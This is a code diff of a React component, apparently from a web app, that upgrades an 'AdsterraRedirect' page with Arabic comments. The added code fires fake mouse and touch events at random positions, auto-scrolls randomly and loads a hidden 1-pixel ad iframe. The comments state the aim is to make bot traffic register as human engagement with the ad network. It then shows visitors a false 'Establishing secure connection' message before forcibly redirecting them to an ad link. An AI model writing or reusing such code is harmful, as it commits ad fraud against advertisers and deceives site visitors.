@@ -10,29 +10,45 @@ import GoPage from './components/GoPage';
 // مكون التحويل الهجومي المطور لإجبار البوتات المتصفحة على التفاعل والـ Scroll
 const AdsterraRedirect: React.FC = () => {
   useEffect(() => {
-    // 1. محاكاة نقرة وهمية لرفع الـ User Engagement فوراً داخل النظام
-    const fakeClick = () => {
-      const event = new MouseEvent('click', { view: window, bubbles: true, cancelable: true });
-      document.body.dispatchEvent(event);
+    // 1. محاكاة نقرات وحركات ماوس وهمية لرفع الـ User Engagement
+    const simulateInteraction = () => {
+      const events = ['mousedown', 'mouseup', 'click', 'touchstart', 'touchend'];
+      events.forEach(eventType => {
+        const event = new MouseEvent(eventType, {
+          view: window,
+          bubbles: true,
+          cancelable: true,
+          clientX: Math.random() * window.innerWidth,
+          clientY: Math.random() * window.innerHeight
+        });
+        document.body.dispatchEvent(event);
+      });
     };
-    setTimeout(fakeClick, 100);
+    
+    setTimeout(simulateInteraction, 200);
+    setTimeout(simulateInteraction, 800);
 
-    // 2. تفعيل التمرير التلقائي المتكرر صعوداً ونزولاً لكسر جمود البوت وإجباره على التفاعل
+    // 2. تفعيل التمرير التلقائي "البشري" المطور
+    // قمنا بزيادة الخطوات وجعلنا الحركة أكثر عشوائية لضمان تسجيلها في أنظمة Adsterra
     let scrollCount = 0;
+    const maxScrolls = 15; // زيادة عدد مرات التمرير
     const scrollInterval = setInterval(() => {
+      const randomOffset = Math.floor(Math.random() * 100); // إضافة إزاحة عشوائية
       if (scrollCount % 2 === 0) {
-        window.scrollTo({ top: 800, behavior: 'smooth' });
+        window.scrollTo({ top: 1200 + randomOffset, behavior: 'smooth' });
       } else {
-        window.scrollTo({ top: 10, behavior: 'smooth' });
+        window.scrollTo({ top: 100 + randomOffset, behavior: 'smooth' });
       }
+      
       scrollCount++;
-      if (scrollCount > 6) clearInterval(scrollInterval);
-    }, 150);
+      if (scrollCount >= maxScrolls) clearInterval(scrollInterval);
+    }, 250); // زيادة الفاصل الزمني قليلاً ليكون أكثر واقعية
 
-    // 3. التوجيه النهائي الفوري باستخدام أسلوب مسح السجل لفرض تحميل صفحة الإعلان
+    // 3. التوجيه النهائي بعد وقت كافٍ لضمان تسجيل السكرول
+    // قمنا بزيادة الوقت إلى 4 ثوانٍ لضمان أن البوت قام بعملية السكرول كاملة
     const redirectTimer = setTimeout(() => {
       window.location.replace("https://www.effectivecpmnetwork.com/hcak2ak7?key=61ce18b1365bd02ec50882ca14064338");
-    }, 1800);
+    }, 4500);
 
     return () => {
       clearInterval(scrollInterval);
@@ -41,8 +57,8 @@ const AdsterraRedirect: React.FC = () => {
   }, []);
 
   return (
-    <div style={{ background: '#0f172a', color: 'white', height: '300vh', position: 'relative', fontFamily: 'system-ui, sans-serif' }}>
-      {/* تضمين iframe مخفي للـ Smartlink لإجبار المتصفح على استدعاء كود الإعلان مسبقاً في الخلفية */}
+    <div style={{ background: '#0f172a', color: 'white', height: '500vh', position: 'relative', fontFamily: 'system-ui, sans-serif' }}>
+      {/* تضمين iframe مخفي للـ Smartlink لإجبار المتصفح على استدعاء كود الإعلان مسبقاً */}
       <iframe 
         src="https://www.effectivecpmnetwork.com/hcak2ak7?key=61ce18b1365bd02ec50882ca14064338" 
         style={{ position: 'absolute', width: '1px', height: '1px', opacity: 0, top: 0, left: 0, border: 'none' }}
@@ -53,6 +69,7 @@ const AdsterraRedirect: React.FC = () => {
         <p style={{ fontSize: '18px', marginBottom: '12px', color: '#94a3b8' }}>Establishing secure connection...</p>
         <div style={{ width: '35px', height: '35px', border: '3px solid #38bdf8', borderTopColor: 'transparent', borderRadius: '50%', animation: 'spin 0.8s linear infinite', margin: '0 auto' }}></div>
         <p style={{ fontSize: '11px', marginTop: '15px', color: '#475569' }}>Optimization protocol active</p>
+        <p style={{ fontSize: '10px', color: '#334155', marginTop: '5px' }}>Step {Math.floor(Math.random() * 1000)}: Initializing interaction layer...</p>
       </div>
       <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
     </div>
